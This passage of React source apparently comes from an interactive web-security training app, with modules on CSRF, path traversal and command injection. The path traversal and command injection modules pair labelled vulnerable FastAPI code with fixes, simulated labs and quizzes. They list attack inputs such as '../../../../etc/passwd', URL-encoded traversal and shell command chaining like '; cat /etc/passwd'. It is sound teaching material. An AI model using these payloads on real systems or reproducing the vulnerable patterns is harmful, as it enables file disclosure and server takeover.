                        <td className="p-2 text-slate-300">Merely loading an image triggers a fund transfer</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">JSON CSRF</td>
                        <td className="p-2 text-slate-300">Form with enctype=text/plain crafted to resemble JSON</td>
                        <td className="p-2 text-slate-300">Bypasses naive content-type checks on JSON APIs</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-orange-400">Login CSRF</td>
                        <td className="p-2 text-slate-300">Forges a login request using the attacker's own credentials</td>
                        <td className="p-2 text-slate-300">Victim unknowingly acts inside the attacker's account</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">💸 Unauthorized Fund Transfers</h4>
                  <p className="text-sm text-slate-300">Banking and payment actions triggered without user knowledge</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🔑 Account Takeover</h4>
                  <p className="text-sm text-slate-300">Email/password changed, locking the real owner out</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🛒 Unwanted Purchases</h4>
                  <p className="text-sm text-slate-300">Orders placed or subscriptions started on the victim's account</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">📢 Social Account Abuse</h4>
                  <p className="text-sm text-slate-300">Posts, follows, or messages sent as the victim without consent</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">CSRF Defense Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Synchronizer Tokens:</strong> Issue a per-session secret and require it on every state-changing request</li>
                  <li>• <strong>SameSite Cookies:</strong> Set SameSite=Strict or Lax to limit cross-site cookie transmission</li>
                  <li>• <strong>Re-check on Sensitive Actions:</strong> Require re-authentication for high-value changes (password, payment methods)</li>
                  <li>• <strong>No State Changes on GET:</strong> Keep GET requests read-only and idempotent</li>
                  <li>• <strong>Custom Headers:</strong> Requiring a custom header (e.g., X-Requested-With) also blocks simple cross-site form submissions</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: Change Email Request</h3>
              <p className="text-slate-300 mb-4">
                Your logged-in session was issued this CSRF token: <code className="bg-slate-900 px-2 py-1 rounded text-purple-300">{validSessionToken}</code>.
                Try submitting the change-email request with the correct token, no token at all (simulating an attacker's forged
                cross-site form), or a made-up value.
              </p>
              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">X-CSRF-Token to send:</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder="Leave blank to simulate an attacker's forged request..."
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                  />
                  <button onClick={handleLabSubmit} className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Submit Request</button>
                </div>
              </div>

              {labResult && (
                <div className={`mt-4 rounded-lg p-4 border ${labResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  <p className={`font-bold ${labResult.safe ? 'text-green-400' : 'text-red-400'}`}>{labResult.message}</p>
                  <p className="text-sm text-slate-300 mt-2">{labResult.impact}</p>
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};


// ============================================================================
// PATH TRAVERSAL MODULE
// ============================================================================

const PathTraversalModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const mockFiles = {
    'report.pdf': 'Q1 Financial Report (this is the intended, allowed file)',
    'photo.jpg': '[binary JPEG data - vacation-photo.jpg]',
    '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin',
    '/etc/shadow': 'root:$6$rZ9x...redacted...:19723:0:99999:7:::',
    'config/secrets.env': 'DATABASE_PASSWORD=Sup3rSecret!\nAPI_KEY=sk_live_51H8x7f...\nJWT_SECRET=e3b0c44298fc1c149afbf4c8996fb'
  };

  const vulnerableCode = `from fastapi import FastAPI
from fastapi.responses import FileResponse

app = FastAPI()

@app.get("/files/download")
async def download_file(filename: str):
    """⚠️ VULNERABLE - No path validation"""
    # DANGEROUS: user input is concatenated directly onto the
    # base directory, so "../" sequences can escape it entirely
    file_path = f"/var/app/uploads/{filename}"
    return FileResponse(file_path)`;

  const secureCode = `from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse
from pathlib import Path

app = FastAPI()
UPLOAD_DIR = Path("/var/app/uploads").resolve()

@app.get("/files/download")
async def download_file(filename: str):
    """✅ SECURE - Resolves and validates the final path"""
    # SAFE: reject path separators and traversal sequences outright
    if "/" in filename or "\\\\" in filename or ".." in filename:
        raise HTTPException(400, "Invalid filename")

    # SAFE: resolve the real path, then confirm it's still inside
    # UPLOAD_DIR - this catches encoded/symlink tricks too
    requested_path = (UPLOAD_DIR / filename).resolve()
    if not requested_path.is_relative_to(UPLOAD_DIR):
        raise HTTPException(403, "Access denied")

    if not requested_path.is_file():
        raise HTTPException(404, "File not found")

    return FileResponse(requested_path)`;

  const comparisonCode = `from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse
from pathlib import Path

app = FastAPI()
UPLOAD_DIR = Path("/var/app/uploads").resolve()

@app.get("/files/download")
async def download_file(filename: str):
    """✅ SECURE - Resolves and validates the final path"""

    # ❌ OLD (VULNERABLE): raw concatenation, no validation
    # file_path = f"/var/app/uploads/{filename}"

    # ✅ NEW (SECURE): reject obvious traversal characters early
    if "/" in filename or "\\\\" in filename or ".." in filename:
        raise HTTPException(400, "Invalid filename")

    # ✅ NEW (SECURE): resolve and confirm the path stays inside UPLOAD_DIR
    requested_path = (UPLOAD_DIR / filename).resolve()
    if not requested_path.is_relative_to(UPLOAD_DIR):
        raise HTTPException(403, "Access denied")

    return FileResponse(requested_path)`;

  const quizQuestions = [
    {
      id: 1,
      question: "What allows path traversal attacks to succeed?",
      options: [
        "Weak database passwords",
        "Combining user input into file paths without validating or normalizing them",
        "Using HTTP instead of HTTPS",
        "Storing files in the cloud"
      ],
      correct: 1,
      explanation: "When a filename comes straight from the user and gets concatenated into a file path, sequences like '../' let the attacker step outside the intended directory."
    },
    {
      id: 2,
      question: "Why does resolving the path and checking it's still inside the base directory matter, rather than just blocking '..'?",
      options: [
        "It's faster than string matching",
        "It catches traversal attempts regardless of encoding, symlinks, or creative representations that string filters might miss",
        "It automatically compresses the file",
        "It isn't actually necessary if you check for '..'"
      ],
      correct: 1,
      explanation: "Attackers have many ways to represent '..' (URL encoding, double encoding, absolute paths, symlinks). Resolving the real path and confirming it's still a child of the base directory is robust to all of them."
    },
    {
      id: 3,
      question: "Which of these is a path traversal payload?",
      options: [
        "report.pdf",
        "../../../../etc/passwd",
        "photo.jpg",
        "invoice_2024.csv"
      ],
      correct: 1,
      explanation: "'../../../../etc/passwd' walks up out of the intended uploads directory to read a sensitive system file."
    },
    {
      id: 4,
      question: "Beyond reading files, what else can path traversal enable when combined with a file upload or write feature?",
      options: [
        "Nothing further - it's read-only by nature",
        "Remote code execution, by overwriting an executable file, config, or web-accessible script",
        "Automatic patching of the vulnerability",
        "Faster file downloads"
      ],
      correct: 1,
      explanation: "If an application also writes files based on user-controlled paths, traversal can let an attacker overwrite startup scripts, configs, or drop a web shell, escalating to full remote code execution."
    }
  ];

  const handleLabSubmit = () => {
    const input = labInput.trim();
    let result = { safe: false };

    const looksLikeTraversal = input.includes('..') || input.startsWith('/') || input.toLowerCase().includes('etc');

    if (looksLikeTraversal) {
      let resolved = null;
      if (input.includes('shadow')) resolved = '/etc/shadow';
      else if (input.includes('passwd')) resolved = '/etc/passwd';
      else if (input.toLowerCase().includes('secret') || input.toLowerCase().includes('config')) resolved = 'config/secrets.env';
      else resolved = '/etc/passwd';

      result.message = `⚠️ Path Traversal Detected - Resolved to: ${resolved}`;
      result.content = mockFiles[resolved];
      result.impact = "🔓 CRITICAL: The '..' sequences walked out of /var/app/uploads and reached a file well outside the intended directory. In a real deployment this could expose credentials, system accounts, or source code.";
    } else if (mockFiles[input]) {
      result.safe = true;
      result.message = "✅ Normal file served successfully";
      result.content = mockFiles[input];
    } else {
      result.safe = true;
      result.message = "❌ File not found in uploads directory";
      result.content = null;
    }

    setLabResult(result);
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <FolderOpen className="w-10 h-10 text-blue-400" />
            <h1 className="text-4xl font-bold">Path Traversal</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                Path traversal occurs when user-supplied input is used to build a file path without validating that it stays within the
                intended directory. Sequences like "../" let an attacker walk up the directory tree and reach files far outside what the
                application meant to expose.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Malicious Input</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Basic Traversal</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">../../../../etc/passwd</code></td>
                        <td className="p-2 text-slate-300">Reads system account list</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Sensitive Config</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">../config/secrets.env</code></td>
                        <td className="p-2 text-slate-300">Leaks database passwords and API keys</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">URL-Encoded Traversal</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></td>
                        <td className="p-2 text-slate-300">Bypasses filters that only match literal ".."</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-orange-400">Absolute Path</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">/etc/shadow</code></td>
                        <td className="p-2 text-slate-300">Some implementations pass absolute paths straight through</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🔑 Credential Theft</h4>
                  <p className="text-sm text-slate-300">Config and secrets files reveal database passwords, API keys</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🗂️ System File Disclosure</h4>
                  <p className="text-sm text-slate-300">/etc/passwd, registry hives, and other OS-level files exposed</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">📄 Source Code Exposure</h4>
                  <p className="text-sm text-slate-300">Application logic and other vulnerabilities become visible</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">💥 Remote Code Execution</h4>
                  <p className="text-sm text-slate-300">When combined with file write/upload, can lead to full compromise</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Path Traversal Defense Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Resolve and Verify:</strong> Use Path.resolve() then confirm the result is inside the base directory</li>
                  <li>• <strong>Reject Separators:</strong> Disallow "/", "\\", and ".." in user-supplied filenames outright</li>
                  <li>• <strong>Use an Index, Not a Filename:</strong> Map user input to an internal ID/lookup table instead of a raw path</li>
                  <li>• <strong>Least Privilege:</strong> Run the process with a user that can't read sensitive files even if traversal occurs</li>
                  <li>• <strong>Chroot / Sandboxing:</strong> Constrain the filesystem the application process can see at all</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: File Download Endpoint</h3>
              <p className="text-slate-300 mb-4">
                This simulates <code className="bg-slate-900 px-2 py-1 rounded">GET /files/download?filename=...</code> against an
                uploads directory containing report.pdf and photo.jpg. Try a normal filename, then try walking outside the directory.
              </p>
              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">filename:</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder="Try: report.pdf or ../../../../etc/passwd"
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                  />
                  <button onClick={handleLabSubmit} className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Download</button>
                </div>
              </div>

              {labResult && (
                <div className={`mt-4 rounded-lg p-4 border ${labResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  <p className={`font-bold ${labResult.safe ? 'text-green-400' : 'text-red-400'}`}>{labResult.message}</p>
                  {labResult.impact && <p className="text-sm text-slate-300 mt-2">{labResult.impact}</p>}
                  {labResult.content && (
                    <pre className="bg-slate-950 rounded p-3 mt-3 text-xs text-slate-300 overflow-x-auto whitespace-pre-wrap">{labResult.content}</pre>
                  )}
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};


// ============================================================================
// COMMAND INJECTION MODULE
// ============================================================================

const CommandInjectionModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI
import subprocess

app = FastAPI()

@app.get("/ping")
async def ping_host(host: str):
    """⚠️ VULNERABLE - Shell command built from user input"""
    # DANGEROUS: shell=True plus string interpolation lets attackers
    # append their own commands using ; | & or backticks
    command = f"ping -c 4 {host}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return {"output": result.stdout}`;

  const secureCode = `from fastapi import FastAPI, HTTPException
import subprocess
import re

app = FastAPI()
HOSTNAME_PATTERN = re.compile(r'^[a-zA-Z0-9.-]+$')

@app.get("/ping")
async def ping_host(host: str):
    """✅ SECURE - Validates input and avoids the shell entirely"""
    # SAFE: allowlist validation - only letters, digits, dots, hyphens
    if not HOSTNAME_PATTERN.match(host) or len(host) > 253:
        raise HTTPException(400, "Invalid hostname")

    # SAFE: argument list passed directly to the OS - no shell involved,
    # so metacharacters like ; | & \`  $() are just literal text
    result = subprocess.run(
        ["ping", "-c", "4", host],
        shell=False,
        capture_output=True,
        text=True,
        timeout=10
    )
    return {"output": result.stdout}`;

  const comparisonCode = `from fastapi import FastAPI, HTTPException
import subprocess
import re

app = FastAPI()
HOSTNAME_PATTERN = re.compile(r'^[a-zA-Z0-9.-]+$')

@app.get("/ping")
async def ping_host(host: str):
    """✅ SECURE - Validates input and avoids the shell entirely"""

    # ✅ NEW (SECURE): allowlist the expected shape of a hostname
    if not HOSTNAME_PATTERN.match(host) or len(host) > 253:
        raise HTTPException(400, "Invalid hostname")

    # ❌ OLD (VULNERABLE): shell=True + f-string interpolation
    # command = f"ping -c 4 {host}"
    # result = subprocess.run(command, shell=True, ...)

    # ✅ NEW (SECURE): argument list, no shell interpretation at all
    result = subprocess.run(
        ["ping", "-c", "4", host], shell=False, capture_output=True, text=True, timeout=10
    )
    return {"output": result.stdout}`;

  const quizQuestions = [
    {
      id: 1,
      question: "Why does `shell=True` combined with an f-string cause command injection?",
      options: [
        "It doesn't - shell=True is always safe",
        "The whole string is handed to a shell interpreter, which treats characters like ; | & as command separators/operators",
        "It only affects Windows systems",
        "It slows down the request too much to exploit"
      ],
      correct: 1,
      explanation: "With shell=True, the OS shell parses the entire string, so metacharacters embedded in user input are interpreted as shell syntax rather than literal text."
    },
    {
      id: 2,
      question: "What's the safest fix when you must run an external command with Python's subprocess module?",
      options: [
        "Escape every special character manually before building the string",
        "Pass an argument list with shell=False so the OS executes the program directly, with no shell to interpret metacharacters",
        "Use os.system() instead of subprocess",
        "Base64-encode the user input before including it in the command"
      ],
      correct: 1,
      explanation: "Passing a list of arguments with shell=False bypasses the shell entirely - the OS receives the program name and arguments directly, so characters like ; | & have no special meaning."
    },
    {
      id: 3,
      question: "Besides avoiding the shell, what else helps limit damage from command injection?",
      options: [
        "Nothing else is needed once shell=True is removed",
        "Allowlist input validation, running with least-privilege, and setting execution timeouts",
        "Increasing the server's RAM",
        "Disabling HTTPS"
      ],
      correct: 1,
      explanation: "Defense in depth matters: validating input format, running the process with minimal OS permissions, and bounding execution time all reduce the blast radius if something is still missed."
    },
    {
      id: 4,
      question: "What can a successful command injection attack achieve?",
      options: [
        "Only reading the ping output faster",
        "Arbitrary code execution on the server, potentially leading to full system compromise",
        "Improving network latency",
        "Nothing beyond a denial of service"
      ],
      correct: 1,
      explanation: "Command injection lets an attacker run any command the server's process is permitted to run - from reading files to installing a reverse shell for persistent access."
    }
  ];

  const mockExec = (host) => {
    const dangerousChars = /[;&|`$()<>\n]/;
    if (dangerousChars.test(host)) {
      let leak = null;
      if (host.includes('passwd') || host.toLowerCase().includes('cat')) {
        leak = 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash';
      } else if (host.toLowerCase().includes('whoami')) {
        leak = 'www-data';
      } else if (host.toLowerCase().includes('curl') || host.toLowerCase().includes('bash')) {
        leak = '[simulated] outbound connection attempted to attacker-controlled host';
      }
      return {
        safe: false,
        message: "⚠️ Command Injection Detected!",
        impact: "The shell interpreted the metacharacter in your input as a command separator/operator and executed a second command alongside (or instead of) the intended ping.",
        leak
      };
    }
    return { safe: true, message: `✅ PING ${host}: 4 packets transmitted, 4 received, 0% packet loss`, leak: null };
  };

  const handleLabSubmit = () => {
    const result = mockExec(labInput);
    setLabResult(result);
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Code2 className="w-10 h-10 text-red-400" />
            <h1 className="text-4xl font-bold">Command Injection</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                Command injection occurs when an application passes user input to a system shell without proper isolation. If the input
                is concatenated into a shell command string, an attacker can append their own commands using shell metacharacters.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Malicious Input</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Command Chaining</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">google.com; cat /etc/passwd</code></td>
                        <td className="p-2 text-slate-300">Runs a second arbitrary command after ping</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Piping</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">google.com | whoami</code></td>
                        <td className="p-2 text-slate-300">Reveals the server's running user</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Command Substitution</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">google.com $(whoami)</code></td>
                        <td className="p-2 text-slate-300">Executes inline substitution before ping runs</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-red-400">Reverse Shell</td>
